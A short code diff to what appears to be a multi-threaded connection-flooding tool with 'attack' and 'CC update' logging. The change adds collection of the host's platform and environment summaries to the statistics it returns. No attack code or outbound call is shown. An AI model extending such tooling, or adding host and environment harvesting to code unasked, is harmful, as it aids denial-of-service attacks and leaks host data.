@@ -5,7 +5,7 @@ using thread-based parallelism according to the features of their own running ma
 to handle multiple connection to the specified url.
 
 Created:    24 October 2016
-Modified:   14 January 2017
+Modified:   16 January 2017
 """
 
 import os
@@ -23,6 +23,7 @@ import requests
 
 from utils.config import validateConfigFile
 from utils.log import logInfo, logAttack, logCCUpdate
+from utils.sysstat import SysStatistics
 
 
 
@@ -179,6 +180,8 @@ class AllSafeWorkerMaster():
         self._workers = []
         # initializing workers log dictionary
         self._workers_log = dict()
+        # system stats
+        self._sysstats = SysStatistics()
 
     
     def initializeWorkers(self):
@@ -235,9 +238,13 @@ class AllSafeWorkerMaster():
 
         # retrieving statistics
         return {
+            # attack statistics
             "targets" : len(self._targets),
             "workers" : len(self._workers_log.keys()),
-            "timing"  : int(end_time - start_time)
+            "timing"  : int(end_time - start_time),
+            # system statistics
+            "system"  : self._sysstats.getPlatformSummary(),
+            "environ" : self._sysstats.getEnvironmentSummary()
         }
 
 
